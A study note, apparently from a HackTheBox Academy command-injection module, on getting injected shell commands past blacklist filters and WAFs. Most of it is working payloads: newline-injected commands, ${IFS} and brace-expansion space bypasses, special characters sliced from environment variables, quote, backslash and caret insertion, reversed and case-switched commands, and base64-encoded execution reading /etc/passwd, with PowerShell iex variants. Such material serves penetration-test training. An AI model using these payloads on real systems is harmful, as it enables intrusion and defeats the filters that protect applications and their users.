# Filters Evasion
-----

### Identify filters
- Filter/WAF Detection: when trying different operators (&, &&, |, ;), if we get errors from the web page, it means there's a filter in place to protect the application. If the error message displayed a different page, with information like our IP and our request, this may indicate that it was denied by a WAF.
- When it comes to filtering, the application can blacklist operators or blacklist the whole command, or both. Hence, we need to attempt each scenario to figure out the vulnerability.

#### Blacklisted Characters
- If a commands contains a blocked special character, the application might deny the request.

- To find out which character is allowed in the application, use BurpSuite to try each of the operators, which can be found [here](operators.txt) or their [url encoded verion](url-encoded-operators.txt).

![](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_2.jpg)

#### Bypassing Space Filters
- If the application does not allow space character, we can try bypassing it by using tab instead.

![](https://academy.hackthebox.com/storage/modules/109/cmdinj_filters_spaces_3.jpg)

- As we see from the above image that the application accepts the request, meaning we succeed in bypassing space filter by using a tab.

- `${IFS}` is Linux Environment Varible whose default value is a space and a tab. Hence, the payload should look like `127.0.0.1%0a${IFS}`.

- Brace Expansion is another method we can use to bypass space filter, which automatically adds spaces between arguments wrapped between braces `{ls,-la}`. Hence, the payload will look like `127.0.0.1%0a{ls,-la}`.

#### Bypassing Other Blacklisted Characters
- Concept: we will obtain the special character from environment varible values (or $PATH).

- In Linux:
```bash
echo ${PATH} will output `/usr/local/bin:/usr/bin:/bin:/usr/games`. To get the "/" character, we run `echo ${PATH:0:1}`

- Similarly, to get ";" character, we use `${LS_COLORS:10:1}`

- So the final payload looks like: `127.0.0.1${LS_COLORS:10:1}${IFS}whoami`
```

- In Windows:

```shell
# Command Prompt
%HOMEPATH:~6,-11%	# output \


# PowerShell
$env:HOMEPATh[0]	# output \
```

#### Bypassing blacklisted commands
- In case an application blacklists certain commands, we need to find ways to work around.

- A few techniques we can use is using the commands with ' or ", which can be used on both Linux and Windows

```bash
127.0.0.1%0aw'h'o'a'm'i)
```

- In Linux, there are a few characters that can be inserted into the middle of the command

```bash
who$@ami
w\h\o\a\m\i
```

- Similarly, in Windows, we can use `^` character.

```bash
who^ami
```

#### Advanced Command Obfuscation
- In Windows, we can switching the cases of the commands (WhoAmI), which Windows will ignore and execute it.

- In Linux, since it is case-sensitive, we need to convert the command to lowercases before executing

```bash
$(tr "[A-Z]" "[a-z]"<<<"WhoAmI")

Note: The above command uses space. If the application filters spaces, we need to replace it with tabs (%09)
```

- Reverse commands

```bash
# LINUX
echo "whoami" | rev
$(rev<<<"imaohw")

# WINDOWS
"whoami"[-1..-20] -join ''
iex "$('imaohw'[-1..-20] -join '')"
```

- Encoding commands: this is extremely helpful when it comes to using commands with filtered characters.

```bash
echo -n "cat /etc/passwd | grep 33" | base64	# Output: Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==

# On the application
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

- For Windows, we can do similar technique

```PowerShell
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

